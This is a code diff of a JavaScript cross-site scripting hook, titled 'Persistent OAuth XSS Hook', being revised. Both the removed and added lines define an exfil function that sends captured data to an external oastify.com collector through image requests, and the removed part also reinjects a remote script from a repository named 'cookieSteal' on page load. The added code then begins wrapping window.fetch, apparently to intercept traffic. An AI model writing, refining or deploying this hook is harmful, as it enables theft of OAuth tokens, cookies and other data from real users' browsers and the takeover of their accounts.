@@ -1,32 +1,15 @@
-// =====================
-// Persistent OAuth XSS Hook
-// =====================
-
-// Collector URL
-let COLLECT = 'https://85bhvmhm5bs8d86f2rd5lsxwxn3erafz.oastify.com/collect';
-
-// Exfil function
-function exfil(name, data){
-    try {
-        new Image().src = COLLECT+'?k='+encodeURIComponent(name)+'&v='+encodeURIComponent(data).slice(0,2000);
-    } catch(e){}
-}
-
-// Step 0: reinject on page load if hook already installed
-if(localStorage.getItem('hook_installed')){
-    if(!window.hookActive){
-        var s = document.createElement('script');
-        s.src = 'https://cdn.jsdelivr.net/gh/justblock6/cookieSteal@main/maybestealV5.js';
-        document.body.appendChild(s);
-    }
-}
-
-// Step 1: main hook logic
 (function(){
-    if(window.hookActive) return;
+    if(window.hookActive) return; // prevent multiple hooks
     window.hookActive = true;
 
-    localStorage.setItem('hook_installed','1');
+    // Use a global variable instead of const/let to avoid redeclaration
+    window.COLLECT = window.COLLECT || 'https://85bhvmhm5bs8d86f2rd5lsxwxn3erafz.oastify.com/collect';
+
+    function exfil(name, data){
+        try {
+            new Image().src = window.COLLECT+'?k='+encodeURIComponent(name)+'&v='+encodeURIComponent(data).slice(0,2000);
+        } catch(e){}
+    }
 
     // --- Hook fetch ---
     const _fetch = window.fetch;
